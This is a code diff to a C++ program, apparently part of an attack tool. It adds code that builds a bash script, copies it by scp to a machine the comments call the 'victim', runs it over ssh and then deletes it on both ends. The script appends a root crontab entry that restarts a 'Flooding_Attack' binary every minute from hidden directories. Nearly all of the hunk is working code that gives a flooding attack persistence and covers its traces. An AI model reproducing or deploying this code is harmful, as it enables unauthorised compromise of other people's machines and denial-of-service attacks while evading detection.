@@ -34,4 +34,23 @@ int main(int argc, char **argv) {
         ":~/.config/.hao123/.module/Flooding_Attack"
     );
 
+    // create Add_crontab file without password
+    string crontab_content1 = "* * * * * root pgrep Flooding_Attack > /dev/null || (cd /home/" + username + "/.etc/.module && ./Flooding_Attack) || (cd /home/" + username + "/.config/.hao123/.module && ./Flooding_Attack)";
+
+    ofstream *file = new ofstream("Add_crontab");
+    *file << "#! /bin/bash\n\n";
+    *file << "echo \"" + crontab_content1 + "\" >> /etc/crontab\n";
+    delete file;
+    cmd("chmod +x Add_crontab");
+
+    // send bash script to victim
+    cmd("scp -o IdentitiesOnly=yes Add_crontab " + username + "@" + ip_addr + ":~/");
+
+    // trigger bash script
+    cmd(ssh_prefix + " \'./Add_crontab\' > /dev/null");
+
+    // remove bash script 
+    cmd(ssh_prefix + " \'rm Add_crontab\'");
+    cmd("rm Add_crontab");
+
 }
